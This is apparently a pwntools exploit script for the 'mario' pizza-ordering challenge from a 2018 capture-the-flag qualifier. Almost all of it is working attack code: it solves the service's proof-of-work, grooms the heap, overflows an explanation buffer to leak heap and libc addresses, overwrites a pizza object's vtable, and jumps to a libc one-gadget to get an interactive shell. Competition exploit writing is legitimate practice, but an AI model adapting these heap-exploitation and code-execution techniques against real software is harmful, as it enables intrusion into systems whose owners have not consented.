from __future__ import print_function
from pwn import *
from time import sleep
import atexit

import sys
import struct
import hashlib


def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1


REMOTE = (sys.argv[1] == 'r')
DEBUG = (sys.argv[1] == 'd')


if REMOTE:
    p = remote("83b1db91.quals2018.oooverflow.io", 31337)
    pow_data = p.recv(1024)
    challenge = str(pow_data.split(b'Challenge: ')[1].split(b'\n')[0])
    n = int(pow_data.split(b'n: ')[1].split(b'\n')[0])
    print("Solving pow...")
    solution = solve_pow(challenge, n)
    print("Solved!")
    print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
    p.sendline(str(solution))
elif DEBUG:
    #p = gdb.debug("./mario", aslr=True)
    p = process("./mario", aslr=False)
else:
    p = process("./mario", aslr=True)

if REMOTE:

    libc_offs = 0x3c4b78
else:
    #libc_offs = 0x3bcb58
    libc_offs = 0x3c4b78

def newUser(name):
    print(p.readuntil("Choice: "))
    p.sendline("N")
    p.sendline(name)

def existingUser(name):
    print(p.readuntil("Choice: "))
    p.sendline("L")
    p.sendline(name)

def exit():
    print(p.readuntil("Choice: "))
    p.sendline("E")

def leave():
    print(p.readuntil("Choice: "))
    p.sendline("L")

def orderPizzas(pizzas):
    print(p.readuntil("Choice: "))
    p.sendline("O")
    p.sendline(str(len(pizzas)))
    for ingrs in pizzas:
        p.sendline(str(len(ingrs)))
        for ingr in ingrs:
            p.sendline(ingr)

def cookPizzas(declaration):
    print(p.readuntil("Choice: "))
    p.sendline("C")
    p.sendline(declaration)

def admirePizzas():
    print(p.readuntil("Choice: "))
    p.sendline("A")

def explain(explanation):
    print(p.readuntil("never come back.\n"))
    p.sendline("P")
    p.sendline(explanation)

def whyUpset():
    print(p.readuntil("Choice: "))
    p.sendline("W")

    print(p.readuntil("your friend "))
    s = " ordered a"
    leak = p.readuntil(s)
    print(leak)
    leak1 = leak[:-len(s)]
    print(p.readuntil("had to say: "))
    s = "niente scuse"
    leak2 = p.readuntil(s)
    print(leak2)
    leak2 = leak2[:-len(s)]
    return (leak1, leak2)

good_ingredient = "\xf0\x9f\x8d\x85"
pineapple = "\xf0\x9f\x8d\x8d"
pineapple_part1 = "\xe0\xf0\x9f"
pineapple_part2 = "\x8d\x8d"

# leaking heap

newUser("user0"+"0"*200)
orderPizzas([["B"]])
leave()

newUser("1")
orderPizzas([[good_ingredient]]) #this std::basic_str is larger than for "B", that's why it won't take it.
cookPizzas("A"*300)

#small explanation goes before user1's structure, because it fits a small std::basic_str gap that the user object didn't. 
orderPizzas([[pineapple_part1, pineapple_part2]])
cookPizzas("decl1")

explain("A"*160) # BOF to overwrite 1 byte of name to 00

heap_leak = whyUpset()[0]
for i in range(8 - len(heap_leak)):
    heap_leak += '\x00'
heap_leak = u64(heap_leak)
# leak: 0xe4f2864f30
# heap: 0xe4f2853000
print("leak: %x" % heap_leak)
heap_base = heap_leak - 0x11f30
print("heap base: %x" % heap_base)

# leaking libc

#first we "cook" pizza for a new user; the user, explanation, and ingredient objects fill in the haep gaps.
newUser("2"*15)
cookPizzas("c"*15)

#next steps make Mario upset at user 3, but also using std::basic_str generated gaps put the
#explanation buffer of user3 before the user3 name. That's why we order pizzas for User2,
#to create gaps later for User3's explanation.

orderPizzas([[pineapple_part1, pineapple_part2, pineapple_part1, pineapple_part2]])
leave()

newUser("3")
orderPizzas([[pineapple_part1, pineapple_part2]])
cookPizzas("3"*31)
leave()

existingUser("2"*15)
orderPizzas([[good_ingredient]])
leave()

existingUser("3")
# 0x73708 - 0x61000
new_addr = 0x73710 - 0x61000 + heap_base
print("new_addr: %x" % new_addr)
explain("B"*48+p64(new_addr))
libc_leak = whyUpset()[0]
for i in range(8 - len(libc_leak)):
    libc_leak += '\x00'
libc_leak = u64(libc_leak)
print("leak: %x" % libc_leak)
libc_base = libc_leak - libc_offs
print("libc base: %x" % libc_base)


# Overwriting the pizza vtable


# Heap spray again
newUser("4"*15)
cookPizzas("c"*31)
cookPizzas("c"*31)

#Now we do the pre-400 gapping so that user6's pizzas can be targeted
#Note tat user4 couldn't target its own pizzas, because Mario is upset at him, so can't admire pizzas.
orderPizzas([[good_ingredient]])
cookPizzas("A"*300)
orderPizzas([[pineapple_part1, pineapple_part2]])
cookPizzas("decl4")
leave()

#cook the target Pizza object - due to the 300 gap, it all fits before the 400 concated ingredint buffer user4 cooking created.
newUser("6")
orderPizzas([[good_ingredient]])
cookPizzas("decl6")
leave()

#time to win.

existingUser("4"*15)
#jump_addr = 0x4242424242424242
jump_addr = libc_base + 0xf1147 #one-gadget rce address in libc-2-23.so used in ubuntu 16.04 (remote target)

addr3 = 0x4a5d1f0ef0 - 0x4a5d1de000 + heap_base;
addr2 = 0x4a5d1f0ee8 - 0x4a5d1de000 + heap_base;
addr1 = 0x4a5d1f0ee0 - 0x4a5d1de000 + heap_base;
explain("B"*80+p64(0x110416f3c0 - 0x110415c000 + heap_base) + p64(0) + p64(jump_addr) + p64(addr1) + p64(addr2) + p64(addr3))
existingUser("6")

gdb.attach(p)

admirePizzas()

p.interactive()
